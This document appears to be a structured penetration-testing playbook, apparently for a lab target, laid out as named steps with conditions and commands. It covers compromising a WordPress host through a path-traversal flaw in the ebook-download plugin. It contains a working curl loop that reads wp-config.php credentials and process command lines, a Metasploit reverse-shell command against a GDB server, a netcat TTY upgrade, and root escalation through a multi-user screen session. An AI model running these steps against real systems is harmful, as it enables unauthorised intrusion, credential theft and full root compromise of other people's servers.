name: LFI to Source Code Disclosure

decision_points.if: LFI vulnerability found in WordPress plugin
decision_points.then: Attempt to retrieve sensitive configuration files like wp-config.php

follow_up: Attempt to use extracted credentials for authentication

name: Extract WordPress Credentials from wp-config
follow_up: Attempt database login with extracted credentials

name: Brute Force Process List via LFI

indicators: LFI vulnerability allowing file content retrieval

execution: for i in $(seq 1 100000); do curl -s http://$TARGET/wp-content/plugins/ebook-download/includes/download.php?ebook=../../../../proc/$i/cmdline -o /tmp/pids/$i.cmdline; done

decision_points.then: Iterate through PIDs to list running processes and identify gdb server

name: Exploit GDB Server via Metasploit
execution: msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; set RHOST $TARGET; set RPORT $RPORT; exploit"

decision_points.then: Use Metasploit exploit module for GDB server to gain shell access

name: TTY Upgrade via Python
execution: send command to spawn bash shell over netcat

decision_points.then: Upgrade to a fully interactive TTY using Python

success_indicators: Interactive bash shell with TTY features

name: Identify Root Screen Session

decision_points.if: screen process running as root is identified
decision_points.then: Attempt to list or attach to the root screen session

follow_up: Exploit screen session for root access

name: Exploit Screen Multi-User Session

indicators: screen session with multi-user support enabled

decision_points.if: screen session is running and configured for multi-user access with ACLs
decision_points.then: Add current user to screen ACLs and attach to the root session

success_indicators: Root shell obtained by attaching to screen session

decision_points.if: WordPress site identified and API token available
decision_points.then: Run WPScan with API token to enumerate plugins and vulnerabilities
